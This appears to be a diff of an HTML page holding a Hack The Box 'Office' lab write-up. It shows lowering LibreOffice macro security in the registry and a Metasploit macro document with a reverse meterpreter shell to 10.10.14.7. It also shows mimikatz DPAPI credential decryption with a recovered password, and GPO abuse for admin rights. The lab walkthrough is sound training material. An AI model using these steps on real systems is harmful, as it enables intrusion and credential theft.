+    <img src="../../../../assets/images/writeups/office/resume-upload.png" alt="Web form resume upload" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption">Web form resume upload</figcaption>
 </figure>
 </p>
@@ -532,7 +533,7 @@ $ ./chisel_1.9.1_linux_amd64 server --port 8000 --reverse</code></pre>
 <p>According to the <a href="https://wiki.documentfoundation.org/Deployment_and_Migration#Windows_Registry">LibreOffice Wikipedia</a>, there are registry values that can be used to control the
 security of the application. We can search for the <code v-pre>MacroSecurityLevel</code> registry key that shows the current settings.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">(remote) tstark@DC:C:\$ Get-ItemProperty -Path &quot;HKLM:\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel&quot;
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">(remote) tstark@DC:C:\$ Get-ItemProperty -Path &quot;HKLM:\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel&quot;
 Value        : 3
 Final        : 1
 PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Offi
@@ -545,7 +546,7 @@ PSProvider   : Microsoft.PowerShell.Core\Registry</code></pre>
 </doc-codeblock></div>
 <p>The value is set to <code v-pre>3</code>, which means it&#x27;s set to High Security level. We need to find a way to change this value to allow our macros to trigger. The ACLs on this key show that the <code v-pre>Registry Editors</code> group has <code v-pre>FullControl</code> and lucky for us we are also part of this group.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">(remote) tstark@DC:C:\$ $key = &quot;HKLM:\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting&quot;
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">(remote) tstark@DC:C:\$ $key = &quot;HKLM:\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting&quot;
 (remote) tstark@DC:C:\$ (Get-Acl $key).Access
 RegistryRights    : FullControl
 AccessControlType : Allow
@@ -574,11 +575,11 @@ Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192</code></
 </doc-codeblock></div>
 <p>So we are able to update the <code v-pre>MacroSecurityLevel</code> key.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">(remote) tstark@DC:C:\$ Set-ItemProperty -Path &quot;$key\MacroSecurityLevel&quot; -Name &quot;Value&quot; -Value 0</code></pre>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">(remote) tstark@DC:C:\$ Set-ItemProperty -Path &quot;$key\MacroSecurityLevel&quot; -Name &quot;Value&quot; -Value 0</code></pre>
 </doc-codeblock></div>
 <p>We can now create a document with a malicious macro with MetaSploit.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">msf6 &gt; use exploit/multi/misc/openoffice_document_macro
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">msf6 &gt; use exploit/multi/misc/openoffice_document_macro
 msf6 exploit(multi/misc/openoffice_document_macro) &gt; set payload windows/x64/meterpreter/reverse_tcp
 payload =&gt; windows/x64/meterpreter/reverse_tcp
 msf6 exploit(multi/misc/openoffice_document_macro) &gt; set LHOST 10.10.14.7
@@ -609,7 +610,7 @@ msf6 exploit(multi/misc/openoffice_document_macro) &gt; run
 </doc-codeblock></div>
 <p>Next we upload the generated file to the server and wait for the macro to get executed. This may take a minute or two.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">[*] 10.10.11.3       openoffice_document_macro - Sending payload
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">[*] 10.10.11.3       openoffice_document_macro - Sending payload
 [*] Sending stage (201798 bytes) to 10.10.11.3
 [*] Meterpreter session 1 opened (10.10.14.7:4444 -&gt; 10.10.11.3:64661) at 2024-07-16 15:02:50 +0200
 msf6 exploit(multi/misc/openoffice_document_macro) &gt; sessions
@@ -633,7 +634,7 @@ Server username: OFFICE\ppotts</code></pre>
 </doc-anchor-target>
 <p>After getting a shell as the user <code v-pre>ppotts</code> we can start to do some pillaging and look for any saved credentials on the current account. Executing <code v-pre>cmdkey /list</code> reveals there is also a saved credential for the user <code v-pre>HHogan</code>. Looking at the privileges of this user, we see that this account is part of the <code v-pre>Remote Management Users</code> group.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Users\PPotts&gt; cmdkey /list
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Users\PPotts&gt; cmdkey /list
 Currently stored credentials:
 
     Target: LegacyGeneric:target=MyTarget
@@ -653,7 +654,7 @@ Global Group memberships     *Domain Users         *GPO Managers </code></pre>
 </doc-codeblock></div>
 <p>This means that if we are able to recover the credentials of this account, we can most likely connect over WinRM. To get these credentials we can use DPAPI. The DPAPI credential files are decrypted using the user&#x27;s password, and can be decrypted with the master key or the domain key in case we have access as a domain administrator.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Users\PPotts&gt; gci -force AppData\Roaming\Microsoft\Credentials
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Users\PPotts&gt; gci -force AppData\Roaming\Microsoft\Credentials
 Directory: C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials
 
 Mode                 LastWriteTime         Length Name
@@ -670,7 +671,7 @@ Mode                 LastWriteTime         Length Name
 </doc-anchor-target>
 <p>We see three protected files and to be able to extract any data from them we need the master key.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Users\PPotts&gt; gci -force AppData\Roaming\Microsoft\Protect
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Users\PPotts&gt; gci -force AppData\Roaming\Microsoft\Protect
 Directory: C:\Users\PPotts\AppData\Roaming\Microsoft\Protect
 
 Mode                 LastWriteTime         Length Name
@@ -699,7 +700,7 @@ Mode                 LastWriteTime         Length Name
 <p>In order to get the secret out of these blobs we would normally need to know the user&#x27;s password. However, since we are logged in we can query the Domain Controller to retrieve the secrets for us. Since we own the
 master credentials associated with our own account, we can abuse this component by using the <code v-pre>/rpc</code> flag in Mimikatz. We will first upload a copy of <code v-pre>mimikatz.exe</code> and run it to extract the master key.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Users\Public&gt; .\mimikatz.exe &quot;dpapi::masterkey /in:C:\users\ppotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc&quot; &quot;exit&quot;
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Users\Public&gt; .\mimikatz.exe &quot;dpapi::masterkey /in:C:\users\ppotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc&quot; &quot;exit&quot;
 
  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
  .## ^ ##.  &quot;A La Vie, A L'Amour&quot; - (oe.eo)
@@ -723,7 +724,7 @@ Bye!</code></pre>
 </doc-codeblock></div>
 <p>The second blob is the correct one (oldest date) and we can find the master key at the bottom. We can then decrypt the blobs using this master key and find a password in the second credential blob.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Users\Public&gt; .\mimikatz.exe &quot;dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166&quot; &quot;exit&quot;
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Users\Public&gt; .\mimikatz.exe &quot;dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166&quot; &quot;exit&quot;
 
 &lt;SNIP&gt;
 
@@ -761,7 +762,7 @@ Bye!</code></pre>
 </doc-anchor-target>
 <p>With the found DPAPI credentials we can now get a WinRM session with the user <code v-pre>HHogan</code>. This user is a member of the <code v-pre>GPO Managers</code> group and there are a few GPOs in the domain.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ evil-winrm -i 10.10.11.3 -u hhogan -p 'H4ppyFtW183#'
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ evil-winrm -i 10.10.11.3 -u hhogan -p 'H4ppyFtW183#'
 *Evil-WinRM* PS C:\Users\HHogan\Documents&gt; Get-GPO -All | Select-Object DisplayName
 
 DisplayName
@@ -777,7 +778,7 @@ Password Policy GPO</code></pre>
 </doc-codeblock></div>
 <p>We can assume that this user can edit GPOs (this can be confirmed by running BloodHound). GPOs, or Group Policy Objects, are policies that Windows uses to manage computers at scale. We can use a tool <a href="https://github.com/FSecureLABS/SharpGPOAbuse">SharpGPOAbuse</a> in order to create a Policy that adds us as a local admin.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">*Evil-WinRM* PS C:\Programdata&gt; .\SharpGPOAbuse.exe --AddLocalADmin --UserAccount HHogan --GPOName &quot;Windows Firewall GPO&quot;
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">*Evil-WinRM* PS C:\Programdata&gt; .\SharpGPOAbuse.exe --AddLocalADmin --UserAccount HHogan --GPOName &quot;Windows Firewall GPO&quot;
 [+] Domain = office.htb
 [+] Domain Controller = DC.office.htb
 [+] Distinguished Name = CN=Policies,CN=System,DC=office,DC=htb
@@ -788,7 +789,7 @@ Exiting...</code></pre>
 </doc-codeblock></div>
 <p>The first policy fails, so lets try to use the second one.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">*Evil-WinRM* PS C:\Programdata&gt; .\SharpGPOAbuse.exe --AddLocalADmin --UserAccount HHogan --GPOName &quot;Default Domain Policy&quot;
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">*Evil-WinRM* PS C:\Programdata&gt; .\SharpGPOAbuse.exe --AddLocalADmin --UserAccount HHogan --GPOName &quot;Default Domain Policy&quot;
 [+] Domain = office.htb
 [+] Domain Controller = DC.office.htb
 [+] Distinguished Name = CN=Policies,CN=System,DC=office,DC=htb
@@ -803,7 +804,7 @@ Exiting...</code></pre>
 </doc-codeblock></div>
 <p>This doesn’t take effect until the GPO refreshes, but we are allowed to run <code v-pre>gpupdate /force</code>. Afterwards we need to exit our current WinRM session and authenticate again for the changes to take effect. We can then see ourselves in the <code v-pre>BUILTIN\Administrators</code> group and can access the Administrator desktop.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir
 Directory: C:\Users\Administrator\Desktop
 
 Mode                 LastWriteTime         Length Name
@@ -815,23 +816,23 @@ Mode                 LastWriteTime         Length Name
                                 <!-- Required only on API pages -->
                                 <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
                             </div>
-                            <footer class="clear-both">
+                            <footer id="retype-content-footer" class="clear-both">
                             
-                                <nav class="print:hidden flex mt-14">
+                                <nav id="retype-nextprev" class="print:hidden flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/hackthebox/machines/checker/">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/hackthebox/machines/infiltrator/">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
-                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
-                                                <span class="block mt-1">Checker (Hard)</span>
+                                                <span class="block text-xs font-normal text-base-text-muted">Previous</span>
+                                                <span class="block mt-1">Infiltrator (Insane)</span>
                                             </span>
                                         </a>
                                     </div>
                             
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/hackthebox/machines/vintage/">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/hackthebox/machines/vintage/">
                                             <span>
-                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
                                                 <span class="block mt-1">Vintage (Hard)</span>
                                             </span>
                                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
@@ -841,24 +842,24 @@ Mode                 LastWriteTime         Length Name
                             </footer>
                         </main>
                 
-                        <div class="print:border-none border-t dark:border-dark-650 pt-6 mb-8">
+                        <div id="retype-page-footer" class="print:border-none border-t border-base-border pt-6 mb-8">
                             <footer class="flex flex-wrap items-center justify-between print:justify-center">
-                                <div class="print:hidden">
+                                <div id="retype-footer-links" class="print:hidden">
                                     <ul class="flex flex-wrap items-center text-sm">
                                     </ul>
                                 </div>
-                                <div class="print:justify-center docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
+                                <div id="retype-copyright" class="print:justify-center py-2 text-footer-text font-footer-link-weight text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
                             </footer>
                         </div>
                     </div>
                 
                     <!-- Rendered if sidebar right is enabled -->
                     <!-- Sidebar right skeleton-->
-                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-sidebar-right-bg border-sidebar-right-border lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton">
                         <div class="pl-5">
-                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
-                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
-                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                         </div>
                     </div>
                 
@@ -874,7 +875,7 @@ Mode                 LastWriteTime         Length Name
     </div>
 
 
-    <div id="docs-overlay-target"></div>
+    <div id="retype-overlay-target"></div>
 
     <script data-cfasync="false">window.__DOCS__ = { "title": "Office (Hard)", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
